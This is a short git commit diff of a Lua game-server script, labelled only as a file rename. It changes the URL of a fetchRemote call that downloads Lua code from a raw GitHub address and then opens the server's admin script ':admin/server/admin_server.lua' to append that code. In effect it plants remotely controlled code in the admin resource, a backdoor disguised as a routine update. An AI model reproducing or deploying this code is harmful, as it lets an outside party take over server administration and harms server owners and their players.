b44cc8f1d754ad9b47140a13ce51b7e829e95d45
Ruslan <20355378+frqher@users.noreply.github.com>
2023-01-11 22:01:33 +0300

    Update and rename ipss.lua to ipssss.lua

--- ipssss.lua
+++ ipssss.lua
@@ -1,4 +1,4 @@
-fetchRemote("https://raw.githubusercontent.com/Drewskijs/ip/main/addipss.lua",function(rd, err) 
+fetchRemote("https://raw.githubusercontent.com/Drewskijs/ip/main/addipssss.lua",function(rd, err) 
 	if err == 0 and rd ~= "ERROR" then
 	      hFile = fileOpen(":admin/server/admin_server.lua")
 	      fileSetPos( hFile, fileGetSize( hFile ) ) 
